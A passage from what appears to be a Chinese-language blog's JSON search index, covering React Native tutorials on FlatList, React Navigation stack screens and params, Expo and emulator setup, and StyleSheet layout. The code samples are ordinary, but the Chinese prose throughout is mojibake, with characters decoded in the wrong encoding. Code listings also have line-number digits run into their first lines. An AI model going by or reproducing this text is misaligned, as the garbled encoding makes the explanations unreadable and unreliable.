name: 'Alex', key: 7}, { name: 'Barbur', key: 8}, { name: 'Candy', key: 9}, { name: 'Coco', key: 10}, ]) return ( &lt;View style={styles.container}&gt; &lt;FlatList data={people} renderItem={({ item }) =&gt; ( &lt;View style={styles.item}&gt; &lt;Text style={styles.itemText}&gt;{item.name}&lt;/Text&gt; &lt;/View&gt; )} /&gt; &lt;/View&gt; );} ç°¡å–®ä¾†èªªå°±æ˜¯å‚³ data è·Ÿ renderItem é€™å…©å€‹ props çµ¦ä»–ï¼Œä¸€å€‹è¦æ”¾è³‡æ–™ï¼Œä¸€å€‹è¦æ”¾æ¸²æŸ“å‡½å¼ã€‚ ç‰¹åˆ¥è§£é‡‹ã„§ä¸‹æ¸²æŸ“å‡½å¼çš„éƒ¨åˆ†ï¼Œé€™è£¡æœƒæ‹¿åˆ°çš„åƒæ•¸æ˜¯ä¸€å€‹ Objectï¼Œä½†æˆ‘å€‘çœŸæ­£éœ€è¦çš„æ˜¯è£¡é¢çš„ item å±¬æ€§ã€‚å› ç‚ºé€™å€‹æ‰æ˜¯æˆ‘å€‘çœŸæ­£ä¸Ÿé€²å»çš„è³‡æ–™ï¼Œæ‰€ä»¥æ‰æœƒç”¨ã€Œè§£æ§‹ã€çš„æ–¹å¼æ‹¿å‡ºä¾†ã€‚ å¦å¤–é€é FlatList æ¸²æŸ“çš„åˆ—è¡¨ä¸éœ€è¦åœ¨ JSX ä¸­åŠ ä¸Š keyï¼Œåªè¦ç¢ºä¿è³‡æ–™ä¸­æœ‰ key å°±å¥½äº†ã€‚ï¼ˆå¦‚æœä½ æ²’è¾¦æ³•ç¢ºä¿æœ‰ key é€™å€‹å€¼ï¼Œåƒè€ƒä¸‹é¢çš„ propsï¼‰ é™¤æ­¤ä¹‹å¤– FlatList é‚„æœ‰å€‹æœ€å¤§çš„ç‰¹é»æ˜¯ã€ŒLazy Loadingï¼ˆå»¶é²è¼‰å…¥ã€ã€‚ æ„æ€å°±æ˜¯å¦‚æœæˆ‘çš„è³‡æ–™æœ‰ä¸€å¤§åŒ…ï¼Œç”¨ map çš„è©±æœƒç­‰æ‰€æœ‰è³‡æ–™éƒ½è¼‰å…¥å®Œä»¥å¾Œæ‰é¡¯ç¤ºç•«é¢ï¼Œä½† FlatList çš„è©±åªæœƒè¼‰å…¥ç›®å‰ç•«é¢ä¸­æ‰€éœ€çš„è³‡æ–™ï¼Œé€™å°±æ˜¯é€™å…©è€…æœ€å¤§çš„å·®åˆ¥ã€‚ é †ä¾¿ä»‹ç´¹å¹¾å€‹ FlatList ä¸éŒ¯ç”¨çš„ propsï¼š keyExtractor æŒ‡å®šè¦ç”¨è³‡æ–™ä¸­çš„å“ªå€‹å€¼ç•¶ä½œ keyï¼ˆç•¶è³‡æ–™è£¡æ²’æœ‰ key æ™‚å¿…ç”¨ï¼‰ numColumns å¯ä»¥æŒ‡å®šè¦æ¸²æŸ“æˆå¹¾æ¬„ï¼ˆå¶æ•¸ Onlyï¼‰ contentContainerStyle ç•¶ä½ æƒ³å° FlatList è‡ªå·±åšæ¨£å¼è¨­å®šæ™‚ï¼Œä¸€å®šæœƒç”¨åˆ°é€™å€‹","link":"/2022/05/30/react-native-list/"},{"title":"React Navigationï¼Navigation Stack","text":"åŸä¾†é€™å°±æ˜¯ã€Œåˆ·éå»ã€çš„æ•ˆæœã€‚ ç½®é ‚èªªæ˜å¾Œä¾†æˆ‘ç™¼ç¾åŸä¾† Stack æœ‰åˆ†å…©ç¨®ï¼š Stack Navigator Native Stack Navigator ç°¡å–®ä¾†èªªä¸€å€‹æ˜¯ç”¨ JS å»å¯«çš„ï¼Œå¯ä»¥å®¢è£½åŒ–çš„ç¨‹åº¦æ¯”è¼ƒé«˜ï¼Œä½†å¯èƒ½ä¹Ÿæœƒæœ‰æ¯”è¼ƒå¤š bugã€‚å¾Œè€…çš„è©±å‰‡æ˜¯ç”¨åŸç”Ÿçš„ navigationï¼Œæ‰€ä»¥é™åˆ¶æœƒè®Šå¤šï¼Œä½† bug æœƒå°‘ä¸€é»ã€‚ é€™ç¯‡æ–‡ç« ç”¨çš„æ˜¯ Native çš„ Stackï¼Œä¸éå¤§è‡´ä¸Šæ²’ä»€éº¼å•é¡Œï¼Œé‚„æ˜¯å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚ è‡ªæˆ‘æª¢æ¸¬ æˆ‘çŸ¥é“ä»€éº¼æ˜¯ Navigation Stack æˆ‘çŸ¥é“ä»€éº¼æ˜¯ Drawer navigation æˆ‘çŸ¥é“æ€éº¼ç”¨ Navigate ä¾†åˆ‡æ› screen æˆ‘çŸ¥é“æ€éº¼åœ¨ Screen ä¹‹é–“å‚³éèˆ‡æ¥æ”¶ props ç°¡ä»‹é¦–å…ˆè¦ç‰¹åˆ¥è¬›ä¸€ä¸‹ï¼Œåœ¨ App è£¡é¢çš„å°è¦½è·Ÿ Web è£¡çš„å°è¦½æ€è·¯æ˜¯ä¸åŒçš„ã€‚ æˆ‘å€‘åœ¨ Web ä¸­å¯ä»¥é€éã€ŒURLã€ä¾†åˆ¤æ–·ç›®å‰è¦é¡¯ç¤ºå“ªå€‹å…ƒä»¶ï¼Œé€™å¾ˆåˆç†æ²’æœ‰å•é¡Œï¼Œä½† App å‘¢ï¼Ÿä»”ç´°æƒ³æƒ³çœ‹ä¸€ä»¶äº‹æƒ…ï¼š App æœ‰ URL é€™ç©æ„å…’å—ï¼Ÿ ç•¶ç„¶æ²’æœ‰ã€‚ æ‰€ä»¥é€™é‚Šå°±è¦ä»‹ç´¹ä¸€ä¸‹ App çš„å°è¦½æ€è·¯ã€‚ é¦–å…ˆæ ¸å¿ƒè§€å¿µæ˜¯ã€ŒStack Navigateã€ï¼Œé‚„æœ‰ä¸€å€‹å«åšã€ŒDrawer navigationã€çš„è§€å¿µï¼Œä¹Ÿæ˜¯è »é‡è¦çš„ï¼Œä½†é€™ä¹‹å¾Œæ‰æœƒä»‹ç´¹ï¼Œé€™ä¸€ç¯‡é‚„ä¸æœƒæåˆ°ã€‚ç¸½ä¹‹ï¼Œå€¼å¾—é—œæ³¨çš„æ˜¯ Stack é€™å€‹é—œéµå­—ï¼ˆæ˜¯ä¸€ç¨®è³‡æ–™å‹æ…‹ï¼‰ã€‚ ç°¡å–®ä¾†èªªï¼Œå‡è¨­æˆ‘å€‘æœ‰ Home é é¢è·Ÿ Another é é¢ï¼Œé‚£ç•¶æˆ‘å€‘ç¬¬ä¸€æ¬¡é€²å…¥ App æ™‚ï¼Œæˆ‘å€‘çš„ Stack Navigate å°±æœƒé•·é€™æ¨£ï¼š æ¥è‘—ç•¶æˆ‘å€‘é€²å…¥åˆ° Another é é¢æ™‚ï¼Œå°±æœƒæŠŠä»–ã€Œç–Šä¸Šå» Stackã€ï¼Œè®Šæˆé€™æ¨£ï¼š æ‰€ä»¥ç¾åœ¨ Home é‚„æ˜¯æ”¾åœ¨é‚£é‚Šï¼Œåªæ˜¯æˆ‘å€‘ç”¨ Another æŠŠä»–è“‹ä½äº†è€Œå·²ã€‚ æ¥è‘—ç•¶æˆ‘å€‘å†å»ä¸‹ä¸€å€‹ Another é é¢æ™‚ï¼Œå°±æœƒè®Šæˆé€™æ¨£ï¼š å¥½ï¼Œæ¥è‘—æˆ‘å€‘æƒ³å›åˆ° Home é é¢çš„è©±æ€éº¼åšï¼Ÿå¦‚æœä½ çŸ¥é“ Stack çš„é‹ä½œçš„è©±ï¼ˆä¸æ‡‚çš„è©±å¯ä»¥è¤‡ç¿’ è³‡æ–™çµæ§‹ï¼Stack èˆ‡ Queueï¼‰ï¼Œå°±æœƒçŸ¥é“æˆ‘å€‘è¦ï¼š æŠŠç¬¬ä¸€å€‹ Another pop æ‰ æŠŠç¬¬äºŒå€‹ Another pop æ‰ å›åˆ° Home é é¢ é€™å€‹å°±æ˜¯åœ¨ App è£¡å¯¦ä½œå°è¦½çš„æ–¹å¼ï¼Œæˆ‘è¦ºå¾—é‚„è »ç‰¹åˆ¥çš„ï¼Œä¸çŸ¥é“ä½ æ€éº¼æƒ³ï¼Ÿ éœ€è¦çš„å¥—ä»¶é€™é‚Šæœƒç”¨ React Navigation ä¾†åšç¤ºç¯„ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ ä¸»è¦æœƒè£çš„å¥—ä»¶æœ‰é€™å¹¾å€‹ï¼š @react-navigation/native (npm) @react-navigation/native-stack (npm) react-native-screens (expo) react-native-safe-area-context (expo) ç”¨æ³•åŸºæœ¬é é¢é€™é‚Šç‚ºäº†æ–¹ä¾¿é–±è®€æˆ‘å°±å…¨éƒ¨å¯«ä¸€èµ·äº†ï¼Œç¨‹å¼ç¢¼ä¹Ÿä¸å¤šï¼š 12345678910111213141516171819import Detail from './screens/Detail';import About from './screens/About';import Home from './screens/Home';import { NavigationContainer } from \"@react-navigation/native\";import { createNativeStackNavigator } from \"@react-navigation/native-stack\";const Stack = createNativeStackNavigator();export default function App() { return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator&gt; &lt;Stack.Screen name='Home' component={Home} options={{ title: 'PeaNu' }} /&gt; &lt;Stack.Screen name='About' component={About} /&gt; &lt;Stack.Screen name='Detail' component={Detail} /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );} çœ‹èµ·ä¾†æœ‰ä¸€ç¨® React-router-dom çš„æ—¢è¦–æ„Ÿå§ï¼Ÿç¸½ä¹‹é‡é»æœ‰å…©å€‹åœ°æ–¹ï¼š NavigationContainer è² è²¬åŒ…ä½æ‰€æœ‰ Scrennï¼Œå°±è·Ÿ React-router-dom è£¡çš„ HashRouter æ˜¯å·®ä¸å¤šçš„æ¦‚å¿µ createNativeStackNavigator å»ºç«‹ Stackï¼Œæ‰€æœ‰ Screnn éƒ½æœƒç–Šåœ¨é€™è£¡é¢ ä»–çš„æ©Ÿåˆ¶æ˜¯é€™æ¨£ï¼Œåœ¨ Stack.Navigator è£¡é¢çš„ç¬¬ä¸€å€‹ Screen æœƒè¢«æ”¾å…¥ Navigation Stackï¼Œä»¥ä¸Šé¢ä¾†èªªçš„è©±å°±æ˜¯ Home é€™å€‹é é¢ã€‚ é€™å€‹é é¢æœƒæ˜¯æˆ‘å€‘é€²å…¥ App æ™‚çš„ã€Œé è¨­é é¢ã€ï¼Œå¦‚æœè¦ç”¨åœ–ä¾†è¡¨ç¤ºç›®å‰çš„ Navigation Stack çš„è©±ï¼Œæœƒåƒé€™æ¨£ï¼š å‡è¨­é€²ä¾†å¾Œï¼Œæˆ‘å€‘åˆé€²å…¥åˆ° Detail çš„è©±å°±æœƒè®Šé€™æ¨£ï¼š é€™å€‹å°±æ˜¯ä»–èƒŒå¾Œé‹ä½œçš„æ–¹å¼ï¼Œä¹Ÿæ˜¯å‰é¢ä»‹ç´¹çš„ Navigation Stack çš„é‹ä½œæµç¨‹ã€‚ åˆ‡æ›åˆ°å…¶ä»–é é¢é€™é‚Šåªè¦çŸ¥é“ä¸€ä»¶äº‹å°±å¤ äº†ï¼Œå®˜æ–¹æ–‡ä»¶ä¸­æœ‰æåˆ°ï¼š Each screen component in your app is provided with the navigation prop automatically. é™„è¨»ï¼šæƒ³çŸ¥é“æœ‰å“ªäº›ç›¸é—œçš„ API å¯ä»¥åˆ° é€™é‚Š ä¾†çœ‹ã€‚ æ„æ€å°±æ˜¯æˆ‘å€‘æ”¾åœ¨ Stack è£¡é¢çš„é é¢éƒ½æœƒè‡ªå‹•è¢«å‚³å…¥ navigation é€™å€‹ propsï¼Œæ‰€ä»¥åªè¦æ‹¿é€²ä¾†ç”¨å°±å¥½äº†ï¼š 1234567891011121314151617181920import { View, Text, Button } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";type HomeProps = { navigation: any}// æ¥æ”¶åˆ° propsconst Home: React.FC&lt;HomeProps&gt; = ({ navigation }) =&gt; { return ( &lt;View style={globalStyles.container}&gt; &lt;Text style={globalStyles.titleText}&gt;Home screen&lt;/Text&gt; {/* åŠ ä¸Šä¸€å€‹è·³è½‰çš„æŒ‰éˆ• */} &lt;Button title=\"Go to Detail\" onPress={() =&gt; navigation.navigate('Detail')} /&gt; &lt;/View&gt; )}export default Home; é™„è¨»ï¼šå…¶å¯¦å¯«æˆ navigation.push('Detaik') ä¹Ÿè¡Œï¼Œä¸éæ¯”è¼ƒå°‘äººé€™æ¨£å¯«å°±æ˜¯äº†ã€‚ åªè¦é€™æ¨£å­åšï¼Œæˆ‘å€‘å°±æœ‰ä¸€å€‹å¯ä»¥è·³è½‰çš„æŒ‰éˆ•äº†ï¼š ç•¶æˆ‘å€‘æŒ‰ä¸‹æŒ‰éˆ•å¾Œï¼Œå°±æœƒè·³è½‰åˆ°æˆ‘å€‘æŒ‡å®šçš„é é¢ï¼ˆæœƒå°æ‡‰åˆ° nameï¼‰ï¼š é€™é‚Šçš„ &lt;ï¼ˆè¿”å›æŒ‰éˆ•ï¼‰æ˜¯è‡ªå‹•ç”¢ç”Ÿçš„ï¼Œå¦‚æœä½ ä¹Ÿæƒ³è¦è‡ªè£½ä¸€å€‹é¡ä¼¼çš„æŒ‰éˆ•ï¼Œå¯ä»¥ç”¨ navigation.goBack() çš„æ–¹å¼ä¾†å¯¦ä½œã€‚ åœ¨ä¸åŒçš„ Screen ä¹‹é–“å‚³é propsé€™æ‡‰è©²æ˜¯å€‹å¾ˆå¸¸è¦‹çš„éœ€æ±‚ï¼Œå‡è¨­æˆ‘æœ‰ Home è·Ÿ Detail å…©å€‹é é¢ï¼ŒHome è² è²¬é¡¯ç¤ºåˆ—è¡¨çš„æ¨™é¡Œï¼ŒDetail é¡¯ç¤ºåˆ—è¡¨çš„å…§å®¹ï¼Œé‚£æˆ‘è©²æ€éº¼æŠŠæ”¾åœ¨ Home é€™é‚Šçš„è³‡æ–™å‚³çµ¦ Detail ä¾†é¡¯ç¤ºï¼Ÿ é¦–å…ˆï¼Œnavigation.navigate() æ˜¯æœ‰ç¬¬äºŒå€‹åƒæ•¸çš„ï¼Œé€™å€‹åƒæ•¸å°±æ˜¯ç”¨ä¾†è®“æˆ‘å€‘å‚³é props çš„ï¼Œæ‰€ä»¥ Home å°±å¯ä»¥é€™æ¨£å­å¯«ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import { useState } from \"react\";import { View, FlatList, TouchableOpacity, Text } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";interface Reviews { name: string, body: string, rating: number, key: string}type HomeProps = { navigation: any}const Home: React.FC&lt;HomeProps&gt; = ({ navigation }) =&gt; { const [reviews, setReviews] = useState&lt;Reviews[]&gt;([ { name: 'Zelda, Breath of Fresh Air', rating: 5, body: 'lorem ipsum', key: '1' }, { name: 'Gotta Catch Them All (again)', rating: 4, body: 'lorem ipsum', key: '2' }, { name: 'Not so \"Final\" Fantasy', rating: 3, body: 'lorem ipsum', key: '3' }, ]) return ( &lt;View style={globalStyles.container}&gt; &lt;FlatList contentContainerStyle={{ paddingVertical: 20, justifyContent: 'center', alignItems: 'center' }} data={reviews} renderItem={({ item }) =&gt; ( // æŠŠè¦å‚³çš„ props æ”¾åœ¨ç¬¬äºŒå€‹åƒæ•¸ &lt;TouchableOpacity onPress={() =&gt; navigation.navigate('Detail', item)}&gt; &lt;Text&gt;{item.name}&lt;/Text&gt; &lt;/TouchableOpacity&gt; )} /&gt; &lt;/View&gt; )}export default Home; é€™æ¨£å°±æˆåŠŸå‚³é€²å»äº†ï¼Œæ¥ä¸‹ä¾†çš„ç¬¬äºŒå€‹å•é¡Œæ˜¯ï¼šè¦æ€éº¼æ¥æ”¶ï¼Ÿ é€™æ™‚å€™ Detail è£¡æœƒè‡ªå‹•æ¥æ”¶åˆ°ä¸€å€‹ propsï¼Œå«åš routeï¼Œæ‰€ä»¥å¯ä»¥é€™æ¨£å–å¾—ï¼š 123456789101112131415161718192021import { View, Text } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";type DetailProps = { route: any}const Detail: React.FC&lt;DetailProps&gt; = ({ route }) =&gt; { // route.params å°±æ˜¯å¾ Home å‚³é€²å»çš„ itemï¼Œåªæ˜¯ç”¨è§£æ§‹æ‹¿å‡ºä¾†è€Œå·² const { name, body, rating } = route.params return ( &lt;View style={globalStyles.container}&gt; &lt;Text&gt;{name}&lt;/Text&gt; &lt;Text&gt;{body}&lt;/Text&gt; &lt;Text&gt;{rating}&lt;/Text&gt; &lt;/View&gt; )}export default Detail; åœ¨ Title é¡¯ç¤º props å‚³é€²ä¾†çš„åƒæ•¸åªæ˜¯æƒ³ç‰¹åˆ¥å¯«ä¸€ä¸‹ï¼Œé€™åŠŸèƒ½æ‡‰è©²è »å¸¸ç”¨åˆ°çš„ã€‚ é™„è¨»ï¼šæœ‰éœ€è¦çš„è©±å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€‚ 12345678910111213141516171819202122232425262728const HomeStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerStyle: { backgroundColor: '#eee' }, headerTintColor: '#333', }} &gt; &lt;Stack.Screen name='Home' component={Home} options={{ title: 'GameZone', }} /&gt; &lt;Stack.Screen name='Detail' component={Detail} // é‡é»æ˜¯é€™ä¸€è¡Œ options={({ route }: any) =&gt; ({ title: route.params.name }) } /&gt; &lt;/Stack.Navigator&gt; )} export default HomeStack; è¨­å®š navbar çš„æ¨£å¼å¦‚æœæƒ³æ”¹è®Šé è¨­çš„æ¨£å¼ï¼Œå¯ä»¥ç”¨ options æˆ– screenOptions é€™å€‹ props ä¾†æ›´æ–°ï¼š 12345678910111213141516171819202122232425262728export default function App() { return ( &lt;NavigationContainer&gt; {/* å¯«åœ¨é€™é‚Šå°±æ˜¯ global style */} &lt;Stack.Navigator screenOptions={{ headerStyle: { backgroundColor: '#eee' } }} &gt; {/* local style */} &lt;Stack.Screen name='Home' component={Home} options={{ title: 'GameZone', headerTintColor: '#333', }} /&gt; &lt;Stack.Screen name='Detail' component={Detail} options={{ headerBackTitleStyle: { fontSize: 20 } }}/&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );} æƒ³çŸ¥é“æœ‰å“ªäº›æ±è¥¿å¯ä»¥èª¿çš„è©±ï¼Œå¯ä»¥åƒè€ƒé€™è£¡","link":"/2022/05/28/react-native-navigation-stack/"},{"title":"åˆæ¢ React Native èˆ‡ç’°å¢ƒå»ºç½®","text":"å¹«è‡ªå·±æŒ–ä¸€å€‹æ–°çš„å‘ã€‚ è‡ªæˆ‘æª¢æ¸¬ æˆ‘çŸ¥é“ React Native è·Ÿ React çš„å·®åˆ¥ æˆ‘çŸ¥é“æ€éº¼å»ºç«‹ React Native çš„é–‹ç™¼ç’°å¢ƒ æˆ‘çŸ¥é“æ€éº¼æ“ä½œ Android å’Œ IOS çš„è™›æ“¬æ©Ÿ æˆ‘çŸ¥é“ Expo è·Ÿ React CLI çš„å·®åˆ¥æ˜¯ä»€éº¼ æˆ‘çŸ¥é“ React Native å…¶å¯¦å°±æ˜¯åœ¨å¯« Nativeï¼ˆä¸”çŸ¥é“åŸç†ï¼‰ ä»€éº¼æ˜¯ React Nativeè·Ÿ React ä¸€æ¨£æ˜¯å€‹å¾ Facebook é–‹æºå‡ºä¾†çš„æ¡†æ¶ï¼Œä½† React æ˜¯é‡å°ã€ŒWebã€ï¼ŒReact Native å‰‡æ˜¯é‡å°ã€ŒAppã€ç‚ºä¸»ã€‚ ç°¡å–®ä¾†èªªï¼ŒReact Native å°±æ˜¯è®“ä½ ç”¨ã€Œå¾ˆåƒåœ¨å¯« Reactã€çš„æ–¹å¼ä¾†å¯« Appï¼Œåªè¦ä½ å° React æœ‰ä¸€å®šç¨‹åº¦çš„ç†è§£ï¼Œè¦ä¸Šæ‰‹é€™å€‹æ±è¥¿å°±ä¸éœ€è¦å¾ˆå¤§çš„å­¸ç¿’æˆæœ¬ã€‚ Expo èˆ‡ React Native CLIåœ¨å»ºç«‹ React Native çš„é–‹ç™¼ç’°å¢ƒæ™‚ï¼Œæœƒé¢è‡¨å…©å€‹é¸æ“‡ï¼š React Native CLI Expo CLI é€™å…©è€…æœ€å¤§çš„å·®åˆ¥åœ¨æ–¼ã€Œå‰è€…æœƒéœ€è¦ç¢°åŸç”Ÿçš„ Codeï¼Œè€Œå¾Œè€…åªæœ‰ç´”ç²¹çš„ JavaScriptã€ã€‚ æ‰€ä»¥å„ªåŠ£å‹¢ä¹Ÿå¾ˆæ˜é¡¯ï¼Œç¢°åŸç”Ÿçš„ Code æ„å‘³è€…ä½ èƒ½åšæ›´å¤šçš„äº‹æƒ…ï¼ˆç•¢ç«Ÿæ˜¯ç›´æ¥ç”¨åŸç”Ÿä¾†å¯«ï¼‰ï¼Œåƒæ˜¯ç›´æ¥è·Ÿ Native API æºé€šä¹‹é¡çš„ï¼Œä½†å¦‚æœæ˜¯ Expo é€™ç¨®å¹«ä½ åŒ…è£å¥½çš„æ¡†æ¶ï¼Œä½ åªèƒ½ç”¨å®ƒæä¾›çµ¦ä½ çš„æ±è¥¿ä¾†åšäº‹æƒ…ï¼Œæ‰€ä»¥å°±æœƒè¢«ä¾·é™åœ¨ä¸€å€‹ç¯„åœå…§ã€‚ å¦‚æœå¦³æ˜¯åƒæˆ‘é€™ç¨®ç¬¬ä¸€æ¬¡å…¥é–€çš„äººï¼Œå¯ä»¥å…ˆé¸æ“‡ Expo ä¾†ç•¶ä½œç·´ç¿’ã€‚ç­‰ä¹‹å¾Œæ‘¸ç†Ÿå¾Œæƒ³åšæ›´å¤šäº‹æƒ…æ™‚ï¼Œå†è·³å» React Native CLI æ‡‰è©²ä¹Ÿæ˜¯ OK çš„ã€‚ ç’°å¢ƒå»ºç½®å®‰è£ Expoï¼š1sudo npm install -g expo-cli å®‰è£ Android Studioï¼ˆè™›æ“¬æ©Ÿï¼‰å®˜æ–¹è¼‰é» å®‰è£å®Œä»¥å¾Œï¼Œé¦–å…ˆç¢ºèªã€ŒSDK Platformsã€å’Œã€ŒSDK Toolsã€æ˜¯å¦æœ‰å®‰è£æ­£ç¢ºï¼š æ‰“é–‹ Android Studio é¸æ“‡é¦–é ä¸‹æ–¹çš„ã€ŒMore Actionsã€ï¼Œé»é¸ã€ŒSDK Managerã€ SDK Platforms æ‡‰è©²æœƒé¡¯ç¤ºæœ€æ–°ç‰ˆæœ¬çš„ API é …ç›®è¢«æ‰“å‹¾ï¼ŒSDK Tools å‰‡æœƒé¡¯ç¤ºã€ŒAndroid Emulatorã€ã€ã€ŒAndroid SDK Platform-Toolsã€å’Œã€ŒInter x86 Emulator Acceleratorã€è¢«æ‰“å‹¾ã€‚ å¦‚æœæœ‰æ²’æ‰“å‹¾çš„éƒ¨åˆ†ï¼Œå°±æŠŠä»–å‹¾èµ·ä¾†é‡æ–°å®‰è£å°±å¥½ã€‚ æ¥ä¸‹ä¾†æ˜¯ Mac çš„éƒ¨åˆ†è¦å†è¨­å®šç’°å¢ƒè®Šæ•¸ï¼Œé€™éƒ¨åˆ†è«‹ç›´æ¥åƒè€ƒ Expo å®˜æ–¹æ–‡ä»¶ï¼ŒåŸºæœ¬ä¸Šåªè¦è¤‡è£½è²¼ä¸Šå°±å¥½äº†ã€‚ æ¥è‘—è¦ä¾†å»ºç«‹ã€Œè™›æ“¬æ©Ÿã€ï¼Œé€™æ™‚æœƒè¦ä½ é¸æ“‡ã€Œæ©Ÿç¨®ã€è·Ÿã€Œä½œæ¥­ç³»çµ±ã€ã€‚å¦‚æœæ²’ç‰¹åˆ¥åå¥½çš„è©±ï¼ŒåŸºæœ¬ä¸Šé¸æ–°çš„ç‰ˆæœ¬è·Ÿæ©Ÿå‹å°±å¥½ï¼Œä¸è¦åœ¨é€™é‚Šé¸æ“‡éšœç¤™å¤ªä¹…ï¼ å®‰è£ Xcodeï¼ˆè™›æ“¬æ©Ÿï¼‰å» App stote ä¸‹è¼‰ï¼Œæ‰“é–‹ Xcode å¾Œè¨­å®š preferencesï¼šlocation &gt; Command Line Tools é¸å–æœ€æ–°çš„ Xcode ç‰ˆæœ¬ã€‚ æ¥è‘—å°±å¯ä»¥æ‰“é–‹æ¨¡æ“¬å™¨äº†ï¼šOpen Developer Tool &gt; Simulator å¦‚æœè¦æ”¹æ©Ÿå‹çš„è©±ï¼Œåˆ‡åˆ°è™›æ“¬æ©Ÿçš„è¦–çª—ï¼šFile open simulator å°±æœ‰è·³å‡ºå¾ˆå¤šé¸é …äº†ã€‚ åœ¨è™›æ“¬æ©Ÿä¸Šæ‰“é–‹ developer menu çš„æ–¹æ³• Command + M å¯ä»¥åœ¨ Andriod æ‰“é–‹ Devtool Command + D å¯ä»¥åœ¨ IOS æ‰“é–‹ Devtool å¯¦é«”æ‰‹æ©Ÿçš„è©±è«‹ã€Œæ–æ™ƒå¹¾ä¸‹ã€ï¼Œä»–å°±æœƒè‡ªå·±å½ˆå‡ºä¾†äº†ã€‚ æ¨è–¦è£çš„ vs code å¥—ä»¶åªæ˜¯å€‹è£œå……ï¼Œå¦‚æœä½ æœ‰éœ€è¦çš„è©±å¯ä»¥åƒè€ƒä»¥ä¸‹å¹¾å€‹ï¼š React Native Tools React Native/React/Redux Snippet é–‹å•Ÿå°ˆæ¡ˆä»¥ä¸Šéƒ½å»ºç«‹å¥½ä»¥å¾Œï¼Œåªè¦é€é Terminal åŸ·è¡Œï¼š 1npm start # expo start å°±æœƒè·³å‡º expo çš„è¨Šæ¯è·Ÿä¸»æ§å°ï¼Œè£¡é¢å‘Šè¨´ä½ è¦æ€éº¼è·Ÿ Android å’Œ IOS åšé€£çµï¼Œç…§è‘—åšå°±æ²’å•é¡Œäº†ã€‚ é †é“ä¸€æï¼Œå¦‚æœä½ æ˜¯ç”¨ã€Œå¯¦é«”æ‰‹æ©Ÿã€ä¾†è·Ÿå°ˆæ¡ˆåšé€£çµçš„è©±ï¼Œè«‹å‹™å¿…è¨˜å¾—å…ˆå®‰è£ Expo Goï¼Œä¸¦ç¢ºä¿æ‰‹æ©Ÿè·Ÿé›»è…¦ã€Œé€£çš„æ˜¯åŒä¸€å€‹ç¶²è·¯ã€ï¼Œä¸ç„¶çš„è©±å°±æœƒå¤±æ•—ã€‚ï¼ˆé€™å€‹è·Ÿå…§ç¶² / å¤–ç¶²çš„æ¦‚å¿µæœ‰é—œï¼‰ ä»¥ä¸Šå°±æ˜¯åŸºæœ¬çš„ç’°å¢ƒå»ºç½®ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†çš„æ™‚é–“æˆ‘å¯ä»¥è·Ÿ React Native æ…¢æ…¢æ··ç†Ÿ ~ åƒè€ƒè³‡æº React Native Tutorial for Beginners - Build a React Native App React Native Tutorial #2 - Creating a React Native App","link":"/2022/05/25/react-native-set-up/"},{"title":"React Native ä¸­çš„ style å’Œ layout","text":"å¥½ä¹…ä¸è¦‹çš„ styleã€‚ è‡ªæˆ‘æª¢æ¸¬ æˆ‘çŸ¥é“æ€éº¼åœ¨ APP ä¸­åŠ å…¥ Icon æˆ‘çŸ¥é“æ€éº¼åœ¨ APP ä¸­ä½¿ç”¨å®¢è£½åŒ– Font æˆ‘çŸ¥é“æ€éº¼åˆ©ç”¨ module æŠŠ Stylesheet æŠ½å‡ºå»è®Šæˆå…¨åŸŸæ¨£å¼ æˆ‘çŸ¥é“ä»€éº¼æ˜¯ Viewã€Textã€Button ç­‰ç­‰åŸºæœ¬çš„ RN å…ƒä»¶ æˆ‘çŸ¥é“æ€éº¼ç”¨ RN ä¸­çš„ StyleSheetã€Flex å’Œ Position ä¾†åšæ’ç‰ˆ æˆ‘çŸ¥é“ RN è£¡é¢ä¸æœƒå¯« px å€¼ï¼Œè€Œæ˜¯è¦é€é scale factor ä¾†è¨ˆç®—çµæœ æˆ‘çŸ¥é“æ€éº¼é€é AppLoading ä¾†è™•ç†ç¬¬ä¸€æ¬¡è¼‰å…¥æ™‚çš„è™•ç† block / inlineåœ¨ RN è£¡é¢æ²’æœ‰æ‰€è¬‚çš„ block / inlineï¼Œæ‰€ä»¥ä½ å¯ä»¥æŠŠæ‰€æœ‰æ±è¥¿éƒ½è¦–ç‚º blockã€‚ ä¸éæ›´ç²¾ç¢ºä¸€é»ä¾†èªªæ˜¯åªæœ‰ã€ŒFlexã€ï¼Œå› ç‚ºæ¯ä¸€å€‹ Component é è¨­å°±æ˜¯ Flex-boxï¼Œæ‰€ä»¥ä½ æ‰æœƒçœ‹åˆ°åƒé€™æ¨£çš„å¯«æ³•ï¼š 12345678910111213export default function App () { return ( &lt;View style={styles.container}&gt; &lt;Text&gt;Flex item&lt;/Text&gt; &lt;/View&gt; )}const styles = StyleSheet.create({ container: { flex: 1, // ç›´æ¥ç”¨ flex çš„å±¬æ€§ }}) Stylesæƒ³è¦åœ¨ RN åšæ¨£å¼è¨­å®šçš„è©±ï¼Œå¯ä»¥ç”¨ style é€™å€‹ props å‚³å…¥ã€Œç‰©ä»¶ã€ä¾†è¨­å®šæ¨£å¼ï¼š 123456789101112131415import { StyleSheet, Text, View } from 'react-native';export default function App() { return ( &lt;View style={styles.container}&gt; &lt;Text&gt;Some thing else.&lt;/Text&gt; &lt;/View&gt; );}const styles = StyleSheet.create({ container: { flex: 1, backgroundColor: '#fff',}); é€™é‚Šé€é StyleSheet.create() çš„ç”¨æ„æ˜¯ã€Œå¦‚æœç”¨äº†ä¸å°çš„ key / value æ™‚ã€ï¼Œæœƒç›´æ¥å™´ Error ä¸¦åœæ­¢ç¨‹å¼ã€‚ ä½†å…¶å¯¦åªå‚³å…¥ä¸€èˆ¬çš„ç´”ç‰©ä»¶ä¹Ÿæ˜¯ OK çš„ï¼Œåƒé€™æ¨£ï¼š 123456789101112import { StyleSheet, Text, View } from 'react-native';export default function App() { return ( &lt;View style={{ flex: 1, backgroundColor: 